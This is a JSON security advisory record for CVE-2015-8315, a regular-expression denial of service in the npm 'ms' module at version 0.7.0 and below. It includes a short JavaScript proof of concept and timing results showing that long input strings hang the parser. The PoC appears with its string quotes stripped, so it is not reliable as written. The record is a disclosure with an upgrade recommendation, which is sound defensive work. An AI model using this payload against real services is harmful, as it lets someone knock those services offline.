{
  "id": 46,
  "created_at": "2015-10-24",
  "updated_at": "2016-04-21",
  "title": "Regular Expression Denial of Service",
  "author": {
    "name": "Adam Baldwin",
    "website": null,
    "username": null
  },
  "module_name": "ms",
  "publish_date": "2015-10-24",
  "cves": [
    "CVE-2015-8315"
  ],
  "vulnerable_versions": "<=0.7.0",
  "patched_versions": ">0.7.0",
  "overview": "ms is vulnerable to regular expression denial of service (ReDoS) when extremely long version strings are parsed.        The Regular expression Denial of Service (ReDoS) is a Denial of Service attack, that exploits the fact that most Regular Expression implementations may reach extreme situations that cause them to work very slowly (exponentially related to input size). An attacker can then cause a program using a Regular Expression to enter these extreme situations and then hang for a very long time.[1]        ### Proof of Concept    ```    var ms = require(ms);    var genstr = function (len, chr) {       var result = ;       for (i=0; i<=len; i++) {           result = result + chr;       }           return result;    }        ms(genstr(process.argv[2], 5) +  minutea);        ```        ### Results    Showing increase in execution time based on the input string.    ```    $ time node ms.js 10000        real\t0m0.758s    user\t0m0.724s    sys\t0m0.031s        $ time node ms.js 20000        real\t0m2.580s    user\t0m2.494s    sys\t0m0.047s        $ time node ms.js 30000        real\t0m5.747s    user\t0m5.483s    sys\t0m0.080s        $ time node ms.js 80000        real\t0m41.022s    user\t0m38.894s    sys\t0m0.529s    ```    ",
  "recommendation": "Update to version 0.7.1 or greater. An alternative would be to limit the input length of the user input before passing it into ms.",
  "references": [
    "https://www.owasp.org/index.php/Regular_expression_Denial_of_Service_-_ReDoS"
  ],
  "cvss_vector": "CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L",
  "cvss_score": 5.3,
  "coordinating_vendor": "^Lift Security"
}
